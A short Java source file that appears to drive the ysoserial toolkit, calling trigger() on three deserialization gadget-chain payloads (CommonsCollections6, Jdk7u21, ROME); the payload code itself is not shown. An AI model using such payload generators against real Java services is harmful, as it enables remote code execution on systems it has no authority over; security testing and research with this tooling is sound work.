package ysoserial;

import ysoserial.payloads.CommonsCollections6;
import ysoserial.payloads.Jdk7u21;
import ysoserial.payloads.ROME;

public class GeneratePayload {
    public static void main(String[] args) throws Exception {
        new CommonsCollections6().trigger();
        new Jdk7u21().trigger();
        new ROME().trigger();
    }
}
